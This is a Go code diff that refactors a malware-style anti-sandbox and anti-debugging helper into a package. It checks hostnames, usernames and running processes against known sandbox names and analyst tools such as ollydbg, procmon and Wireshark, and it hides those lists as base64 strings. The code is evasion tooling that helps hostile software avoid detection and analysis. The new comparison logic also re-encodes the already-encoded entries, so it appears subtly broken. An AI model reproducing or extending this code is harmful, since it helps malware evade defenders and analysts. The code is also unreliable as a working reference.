@@ -1,14 +1,14 @@
-package main
+package util
 
 import (
-  "fmt"
-  "runtime"
-  "time"
-  "os"
-  "os/user"
-  "github.com/shirou/gopsutil/mem"
-  "github.com/shirou/gopsutil/disk"
-  "github.com/shirou/gopsutil/process"
+	"encoding/base64"
+	"github.com/shirou/gopsutil/disk"
+	"github.com/shirou/gopsutil/mem"
+	"github.com/shirou/gopsutil/process"
+	"os"
+	"os/user"
+	"runtime"
+	"time"
 )
 
 //判断磁盘信息
@@ -51,107 +51,107 @@ func GetCpuCount()bool {
 //判断机器名是否是沙箱的机器名
 func NoBlockComputerName()bool {
 	known := []string{
-			"SANDBOX",
-			"7SILVIA",
-			"HANSPETER-PC",
-			"JOHN-PC",
-			"MUELLER-PC",
-			"WIN7-TRAPS",
-			"FORTINET",
-			"TEQUILABOOMBOOM",
-			"VBCCSC-PC",
-			"DESKTOP-SVONXYD",
-			"WIN-2HBXSRKWCRY",
-			"WIN-2HBXSRKWCRY",
-			"WIN-IVE99JTTEQ6",
-			"WIN-HHQMQDCBT7E",
-			"0CC47AC83803",
-			"AMAZING-AVOCADO",
-			"rbmhuwvcing",
-			"STACAS84",
-			"SDJ-FFD0FEB05DC"}
+		"U0FOREJPWA==",
+		"N1NJTFZJQQ==",
+		"SEFOU1BFVEVSLVBD",
+		"Sk9ITi1QQw==",
+		"TVVFTExFUi1QQw==",
+		"V0lONy1UUkFQUw==",
+		"Rk9SVElORVQ=",
+		"VEVRVUlMQUJPT01CT09N",
+		"VkJDQ1NDLVBD",
+		"REVTS1RPUC1TVk9OWFlE",
+		"V0lOLTJIQlhTUktXQ1JZ",
+		"V0lOLTJIQlhTUktXQ1JZ",
+		"V0lOLUlWRTk5SlRURVE2",
+		"V0lOLUhIUU1RRENCVDdF",
+		"MENDNDdBQzgzODAz",
+		"QU1BWklORy1BVk9DQURP",
+		"cmJtaHV3dmNpbmc=",
+		"U1RBQ0FTODQ=",
+		"U0RKLUZGRDBGRUIwNURD"}
 	name, _ := os.Hostname()
 
 	for _,v :=range known{
-		if (v == name){
+		if (base64.URLEncoding.EncodeToString([]byte(v)) == name){
 			return false
 		}
 	}
 	//fmt.Println("NoBlockComputerName fine")
 	return true
-	
+
 }
 
 //判断用户名是否是沙箱的用户名
 func NoBlockUserName()bool {
 	known := []string{
-		"CurrentUser",
-		"Sandbox",
-		"Emily",
-		"HAPUBWS",
-		"Hong Lee",
-		"IT-ADMIN",
-		"Johnson",
-		"Miller",
-		"milozs",
-		"Peter Wilson",
-		"timmy",
-		"sand box",
-		"malware",
-		"maltest",
-		"test user",
-		"virus",
-		"John Doe",
-		"vbccsb",
-		"jason",
-		"jojo",
-		"lichao"}
+		"Q3VycmVudFVzZXI=",
+		"U2FuZGJveA==",
+		"RW1pbHk=",
+		"SEFQVUJXUw==",
+		"SG9uZyBMZWU=",
+		"SVQtQURNSU4=",
+		"Sm9obnNvbg==",
+		"TWlsbGVy",
+		"bWlsb3pz",
+		"UGV0ZXIgV2lsc29u",
+		"dGltbXk=",
+		"c2FuZCBib3g=",
+		"bWFsd2FyZQ==",
+		"bWFsdGVzdA==",
+		"dGVzdCB1c2Vy",
+		"dmlydXM=",
+		"Sm9obiBEb2U=",
+		"dmJjY3Ni",
+		"amFzb24=",
+		"am9qbw==",
+		"bGljaGFv"}
 	name, _ := user.Current()
 
 	for _,v :=range known{
-		if (v == name.Username){
+		if (base64.URLEncoding.EncodeToString([]byte(v)) == name.Username){
 			return false
 		}
 	}
 	//fmt.Println("NoBlockUserName fine")
 	return true
-	
+
 }
 
 //判断是否有反调试进程和包含某些必要进程
 func NoBlockUserProcess()bool {
 	known := []string{
-		"ollydbg.exe",
-		"ProcessHacker.exe",
-		"tcpview.exe",
-		"autoruns.exe",
-		"autorunsc.exe",
-		"filemon.exe",
-		"procmon.exe",
-		"regmon.exe",
-		"procexp.exe",
-		"idaq.exe",
-		"idaq64.exe",
-		"ImmunityDebugger.exe",
-		"Wireshark.exe",
-		"dumpcap.exe",
-		"HookExplorer.exe",
-		"ImportREC.exe",
-		"PETools.exe",
-		"LordPE.exe",
-		"SysInspector.exe",
-		"proc_analyzer.exe",
-		"sysAnalyzer.exe",
-		"sniff_hit.exe",
-		"windbg.exe",
-		"joeboxcontrol.exe",
-		"joeboxserver.exe",
-		"joeboxserver.exe",
-		"ResourceHacker.exe",
-		"x32dbg.exe",
-		"x64dbg.exe",
-		"Fiddler.exe",
-		"httpdebugger.exe"}
+		"b2xseWRiZy5leGU=",
+		"UHJvY2Vzc0hhY2tlci5leGU=",
+		"dGNwdmlldy5leGU=",
+		"YXV0b3J1bnMuZXhl",
+		"YXV0b3J1bnNjLmV4ZQ==",
+		"ZmlsZW1vbi5leGU=",
+		"cHJvY21vbi5leGU=",
+		"cmVnbW9uLmV4ZQ==",
+		"cHJvY2V4cC5leGU=",
+		"aWRhcS5leGU=",
+		"aWRhcTY0LmV4ZQ==",
+		"SW1tdW5pdHlEZWJ1Z2dlci5leGU=",
+		"V2lyZXNoYXJrLmV4ZQ==",
+		"ZHVtcGNhcC5leGU=",
+		"SG9va0V4cGxvcmVyLmV4ZQ==",
+		"SW1wb3J0UkVDLmV4ZQ==",
+		"UEVUb29scy5leGU=",
+		"TG9yZFBFLmV4ZQ==",
+		"U3lzSW5zcGVjdG9yLmV4ZQ==",
+		"cHJvY19hbmFseXplci5leGU=",
+		"c3lzQW5hbHl6ZXIuZXhl",
+		"c25pZmZfaGl0LmV4ZQ==",
+		"d2luZGJnLmV4ZQ==",
+		"am9lYm94Y29udHJvbC5leGU=",
+		"am9lYm94c2VydmVyLmV4ZQ==",
+		"am9lYm94c2VydmVyLmV4ZQ==",
+		"UmVzb3VyY2VIYWNrZXIuZXhl",
+		"eDMyZGJnLmV4ZQ==",
+		"eDY0ZGJnLmV4ZQ==",
+		"RmlkZGxlci5leGU=",
+		"aHR0cGRlYnVnZ2VyLmV4ZQ=="}
 	pids,_ := process.Pids()
 	pname := []string{}
 	for _, pid := range pids {
@@ -162,12 +162,12 @@ func NoBlockUserProcess()bool {
 
 	for _,v :=range pname{
 		for _,v1 :=range known{
-			if (v1 == v){
+			if (base64.URLEncoding.EncodeToString([]byte(v1)) == v){
 				return false
 			}
 		}
 	}
-	
+
 	//fmt.Println("NoBlockUserProcess fine")
 	return true
 }
@@ -189,7 +189,6 @@ func RunPath()bool {
 	path := os.Args[0]
 	Name := path[len(path)-len(checkName):len(path)]
 	spath := path[0:len(path)-len(checkName)-1]
-	//fmt.Println(spath)
 	if(Name != checkName){
 		return false
 	}
@@ -199,21 +198,16 @@ func RunPath()bool {
 			return true
 		}
 	}
-	
+
 	return false
 }
 
 
 
-func runbefore()bool {
+func Runbefore()bool {
 	//休眠多少秒
 	time.Sleep(time.Duration(1)*time.Second)
-	res := RunPath() && NoBlockUserProcess() && GetMemPercent() && GetCpuCount() && NoBlockUserName() && NoBlockComputerName() && GetDisk() && HaveFile()
+	res := RunPath() && NoBlockUserProcess() && GetMemPercent() && GetCpuCount() && NoBlockUserName() && NoBlockComputerName() && HaveFile()
 	return res
 }
 
-func main() {
-	if(runbefore()){
-		fmt.Println("all fine")
-	}
-}
